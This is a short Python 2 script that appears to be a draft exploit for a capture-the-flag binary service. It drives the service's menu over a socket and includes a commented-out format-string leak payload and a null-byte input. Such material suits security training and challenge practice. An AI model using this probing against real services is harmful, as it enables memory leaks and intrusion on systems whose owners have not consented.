import socket
from struct import pack

s = socket.socket()
s.connect(('192.168.135.128',8888))
#s.connect(('119.81.181.254',31337))
s.recv(1024)
#raw_input('---')


#s.send(pack('<I',0x602120)+'\x00\x00\x00\x00%6$s'+'\n')


print s.recv(1024)
s.send('5\n')
print s.recv(1024)
s.send('\x00'*32+'\n')
print s.recv(1024)

s.send('2\n')
print s.recv(1024)
s.send('0\n')
print s.recv(1024)

s.send('1\n')
print s.recv(1024)
s.send('51\n')
print s.recv(1024)
s.send('A\n')
print s.recv(1024)
s.send('hhj\n')
print s.recv(1024)
s.send('n\n')
print s.recv(1024)
s.send('3\n')
print s.recv(1024)
s.send('0\n')
print s.recv(1024)
print s.recv(1024)


